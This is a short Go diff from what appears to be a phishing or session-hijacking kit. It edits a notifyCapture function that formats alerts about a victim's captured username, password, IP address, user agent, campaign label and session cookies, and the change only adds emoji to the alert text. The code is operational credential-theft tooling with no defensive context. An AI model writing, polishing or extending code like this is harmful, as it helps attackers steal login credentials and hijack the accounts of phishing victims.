@@ -294,14 +294,14 @@ func notifyCapture(r *http.Request, reqBody []byte, victimCookies []*http.Cookie
 	ip := r.RemoteAddr
 	ua := r.UserAgent()
 
-	msg := fmt.Sprintf("FULL CAPTURE | %s | %s\n"+
-		"Username: %s\n"+
-		"Password: %s\n"+
-		"IP: %s\n"+
-		"User-Agent: %s\n"+
-		"Time: %s\n"+
-		"Campaign: %s\n"+
-		"Session: COOKIES CAPTURED",
+	msg := fmt.Sprintf("\U0001f534 FULL CAPTURE | %s | %s\n"+
+		"\U0001f464 Username: %s\n"+
+		"\U0001f511 Password: %s\n"+
+		"\U0001f310 IP: %s\n"+
+		"\U0001f4bb User-Agent: %s\n"+
+		"\U0001f550 Time: %s\n"+
+		"\U0001f3af Campaign: %s\n"+
+		"\U0001f4ce Session: COOKIES CAPTURED",
 		pl.Label, username,
 		username, password,
 		ip, ua,
